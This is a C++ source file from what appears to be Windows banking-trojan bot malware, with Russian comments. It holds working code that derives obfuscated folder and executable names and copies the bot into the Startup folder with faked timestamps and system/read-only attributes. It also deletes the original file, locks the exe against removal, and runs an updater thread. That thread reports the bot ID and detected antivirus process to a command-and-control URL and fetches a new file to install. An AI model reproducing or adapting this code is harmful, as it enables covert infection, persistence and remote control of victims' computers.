//---------------------------------------------------------------------------
#include <shlobj.h>

#include "BotCore.h"
#include "BotUtils.h"
#include "HTTPConsts.h"
#include "BotDef.h"


//---------------------------------------------------------------------------

//const WORK_PATH[] = {'S', 'E', 'T', '_', 'R', 'N', 'D', '_', 'P', 'A', 'T', 'H', '-', '9',  0};


//---------------------------------------------------------------------------
#define MAX_BOT_WORK_FOLDER_LEN 15

// Рабочий каталог бота
char BOT_WORK_FOLDER_NAME[MAX_BOT_WORK_FOLDER_LEN + 1] = {0};

DWORD BotWorkPathHash = 0;


// Максимальный размер массива шифрованного файла
#define MAX_CRYPTED_EXE_NAME_SIZE 50

// Оригинальное имя ехе файла бота
char OriginalBotExeName[] = {'W', 't', 'J', 'o', 'e', 'B', 't', '.', 'e', 'x', 'e',  0};

// Шифрованное имя исполняемого файла бота
char CryptedBotExeName[MAX_CRYPTED_EXE_NAME_SIZE] = "\0";

// Хэш имени бота
DWORD BotExeNameHash = 0;

//уид бота, инициализируется в функции BOT::Initialize(), также меняется если будет изменен префикс 
//через функцию SetBankingMode()
char BOT_UID[128];



PCHAR BotGetWorkFolder()
{
	// Функция возвращает рабочий каталог бота (короткое имя)

	if (!STR::IsEmpty(BOT_WORK_FOLDER_NAME))
		return BOT_WORK_FOLDER_NAME;

	// Генерируем имя на основе константы обработанной ключём из уида
	const static char WorkPath[] = "WnsBMT";

	PCHAR Name = UIDCrypt::CryptFileName((PCHAR)WorkPath, false);

	// Копируем путь в глобальный массив
	const char *Buf = (Name) ? Name : WorkPath;

	DWORD ToCopy = Min(MAX_BOT_WORK_FOLDER_LEN, STRA::Length(Buf));

	m_memcpy(BOT_WORK_FOLDER_NAME, Buf, ToCopy);
	BOT_WORK_FOLDER_NAME[ToCopy] = 0;

	STR::Free(Name);


	// Получаем уид и шифруем его
/*	PCHAR UID = GenerateBotID();

    PCHAR Password = GetMainPassword(true);

    const static char IV[] = {'d', 'j', 't', 'm', 'f', 'p', 'H', 'k',  0};

	DWORD BufSize = StrCalcLength(UID);
	LPBYTE Encrypted = RC2Crypt::WinEncode((LPBYTE)UID, BufSize, Password, (PCHAR)IV);
	PCHAR B64 = BASE64::Encode(Encrypted, BufSize);

	// Исправляем некоторые символе в результате
	for (PCHAR S = B64; *S != 0; S++)
    {
		if (*S == '/')
			*S = 'z';  // недопустимый символ
		else
		if (*S == '+')
			*S = 'v';  // Редко встречается в названиях, не мозолим глаза :))
	}

	// Копируем строку
	DWORD MCopy = MAX_BOT_WORK_FOLDER_LEN;
	if (MCopy > STR::Length(B64))
		MCopy = STR::Length(B64);

	STR::Copy(B64, BOT_WORK_FOLDER_NAME, 0, MCopy);

	// Уничтожаем промежуточные данные
	STR::Free(Password);
	STR::Free(UID);
	MemFree(Encrypted);
	STR::Free(B64);

	*/

	// Расчитываем хэш
	BotWorkPathHash = CalcHash(BOT_WORK_FOLDER_NAME);

	return BOT_WORK_FOLDER_NAME;
}
//----------------------------------------------------------------------------

PCHAR BOTDoGetWorkPath(bool InSysPath, PCHAR SubDir, PCHAR FileName)
{
	// Функция возвращает рабочий каталог бота

	PCHAR Path = STR::Alloc(MAX_PATH);

	if (!pSHGetSpecialFolderPathA(NULL, Path, CSIDL_APPDATA, TRUE))
		return NULL;


	if (InSysPath)
	{
		// Получаем путь в системной папке
		PCHAR Tmp = STR::Scan(Path, ':');
		if (Tmp == NULL)
			return NULL;
        Tmp++;
		*Tmp = 0;
	}


	PCHAR WorkPath = BotGetWorkFolder(); // резервируем на будущее

	// Добавляем основной путь
	StrConcat(Path, "\\");
	StrConcat(Path, WorkPath);

	if (!DirExists(Path))
		pCreateDirectoryA(Path, NULL);

	StrConcat(Path, "\\");

	// Добавляем подиректорию
	if (!STR::IsEmpty(SubDir))
	{
        PCHAR CryptDir = UIDCrypt::CryptFileName(SubDir, false);

		StrConcat(Path, CryptDir);

        STR::Free(CryptDir);

		if (!DirExists(Path))
			pCreateDirectoryA(Path, NULL);
    }

	PCHAR Result = STR::New(2, Path, FileName);
    STR::Free(Path);
	return  Result;
}
//----------------------------------------------------------------------------


void BOT::Initialize()
{
	// Функция инициализирует глобальные настройки бота

	// Инициализируем апи
	InitializeAPI();

	// Создаём имя рабочей папки
	GetWorkFolderHash();

	GenerateUid(BOT_UID);
	// Включаем создание дампа при исключении
	// Пытаемся встать в начало списка, что дает нам возможность перехватить
	// ошибку до возможно установленных системных VEH.
	//InitialializeGlogalExceptionLogger(TRUE);
}

//----------------------------------------------------------------------------
PCHAR BOT::GetWorkPath(PCHAR SubDir, PCHAR FileName)
{
	//  Функция возвращает рабочий путь бота
    return BOTDoGetWorkPath(false, SubDir, FileName);
}
//----------------------------------------------------------------------------

PCHAR BOT::GetWorkPathInSysDrive(PCHAR SubDir, PCHAR FileName)
{
	//  Аналог функции GetWorkPath.
	//  Главное от личие от неё в том, что пусть
	//   создаётся в корне системного диска
    return BOTDoGetWorkPath(true, SubDir, FileName);
}
//----------------------------------------------------------------------------

DWORD BOT::GetWorkFolderHash()
{
	//  Функция возвращает хэш имени рабочей папки
	BotGetWorkFolder();
	return BotWorkPathHash;
}
//----------------------------------------------------------------------------

PCHAR BOT::GetBotExeName()
{
	//  Функция возвращает имя файла бота

	// При необходимости генерируем имя бота
	if (STR::IsEmpty(CryptedBotExeName))
	{
		PCHAR Name = UIDCrypt::CryptFileName(OriginalBotExeName, false);

		STR::Copy(Name, CryptedBotExeName, 0, StrCalcLength(Name) + 1);

		STR::Free(Name);

		// Расчитываем хэш имени

		BotExeNameHash = CalcHash(CryptedBotExeName);
	}


	return CryptedBotExeName;
}
//----------------------------------------------------------------------------

DWORD BOT::GetBotExeNameHash()
{
	//  Функция возвращает хэш имя файла бота
    GetBotExeName();
    return BotExeNameHash;
}
//----------------------------------------------------------------------------

PCHAR BOT::GetBotFullExeName()
{
	//  Функция возвращает полное имя файла бота

	PCHAR Path = STR::Alloc(MAX_PATH);

	// Получаем путь к папке автозагрузки
	pSHGetSpecialFolderPathA(NULL, Path, CSIDL_STARTUP, TRUE);

    PCHAR Name = STR::New(3, Path, "\\", GetBotExeName());

	STR::Free(Path);

    return Name;
}
//----------------------------------------------------------------------------

HANDLE BotFileHandle = NULL;
HANDLE BotMapHandle = NULL;

void BOT::Protect(PCHAR FileName)
{
	// Функция защищает ехе бота от удаления
	bool FreeName = STR::IsEmpty(FileName);

	if (FreeName)
		FileName = GetBotFullExeName();

	if (FileName == NULL)
    	return;

	// Открываем файл
	BotFileHandle = (HANDLE)pCreateFileA(FileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );


	if (BotFileHandle != INVALID_HANDLE_VALUE)
	{
		BotMapHandle = (HANDLE)pCreateFileMappingA(FileName, NULL, PAGE_READONLY, 0, 0, NULL );
	}

	if (FreeName)
		STR::Free(FileName);
}

//----------------------------------------------------------------------------

void BOT::Unprotect()
{
	// Функция снимает защиту с ехе файла бота
	pCloseHandle(BotFileHandle);
	pCloseHandle(BotMapHandle);

	BotFileHandle = NULL;
	BotMapHandle = NULL;
}
//----------------------------------------------------------------------------


bool BOT::AddToAutoRun(PCHAR FileName)
{
	// Функция добавляет файл в автозагрузку

	if (!FileExistsA(FileName))
		return false;

	PCHAR BotFile = GetBotFullExeName();

	if (StrSame(FileName, BotFile, false, 0))
	{
		STR::Free(BotFile);
		return 0;
    }

    // Снимаем системные атрибуты
	pSetFileAttributesA(BotFile, FILE_ATTRIBUTE_NORMAL);

	// Копируем файл
	bool Result = (BOOL)pCopyFileA(FileName, BotFile, TRUE) == TRUE;

	// Устанавливаем дату файла
	SetFakeFileDateTime(BotFile);

	pSetFileAttributesA(BotFile, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );

	// Удаляем исходный файл
	if (Result)
		pDeleteFileA(FileName);


	STR::Free(BotFile);

	return Result;
}


//----------------------------------------------------
//  BotExeMD5 - Функция возвращает MD5 хэш ехе бота
//----------------------------------------------------
string BOT::BotExeMD5()
{
	string Result = "507535f54ccf135f94e6c495994dcd7b"; // Для тестов левый

	return Result;
}


//****************************************************************************
//                                  TBotUpdater
//****************************************************************************
TBotUpdater::TBotUpdater()
	: TBotThread(false)
{
	Interval = 10000;

	Start();
}
//----------------------------------------------------------

void TBotUpdater::DoExecute()
{
	// Запускаем цикл автоматического обновления бота
	while (!Terminated())
	{
		DWORD UpdateInterval = Interval;

		Update(UpdateInterval);

		pSleep(UpdateInterval);
	}

}
//----------------------------------------------------------

void TBotUpdater::Update(DWORD &UpdateInterval)
{
	// Функция выполняет автоматическое обновление бота

	// Интервал обновления в случае ошибки
	const static DWORD ErrorInterval = 60000;

	PCHAR URL = GetBotScriptURL(SCRIPT_UPDATE_BOT);
	if (!URL)
	{
		UpdateInterval = ErrorInterval;
		return;
	}

	// Выполняем запрос
	string UID = GenerateBotID2();
	string AV  = GetAntiVirusProcessName();
	string MD5 = BOT::BotExeMD5();

	TBotStrings Fields;

	Fields.AddValue(HTTP_FIELD_UID,     UID);
	Fields.AddValue(HTTP_FIELD_ANTIVIR, AV);
	Fields.AddValue(HTTP_FIELD_MD5,     MD5);


	#ifdef CryptHTTPH
		TCryptHTTP HTTP;
		HTTP.Password = GetMainPassword2();
	#else
		THTTP HTTP;
	#endif


	string Buf;

    bool Done = HTTP.Post(URL, &Fields, Buf);

	if (Done && !Buf.IsEmpty())
	{
		// Выполняем обновление
		TBotStrings Values;
		Values.SetText(Buf);

		TURL URL;

		URL.Host     = HTTP.Request.Host;
		URL.Path     = "cfg";
		URL.Document = Values.GetValue("file_name");

		string FileURL = URL.URL();
			   MD5     = Values.GetValue("md5");

		// Загружаем и устанавливаем новую версию
		DownloadAndSetup(FileURL, MD5);
    }

	STR::Free(URL);

}
//----------------------------------------------------------

void TBotUpdater::DownloadAndSetup(const string &FileURL, const string &FileName)
{
	// Функция загржает и устанавливает новую версию бота
}
//----------------------------------------------------------
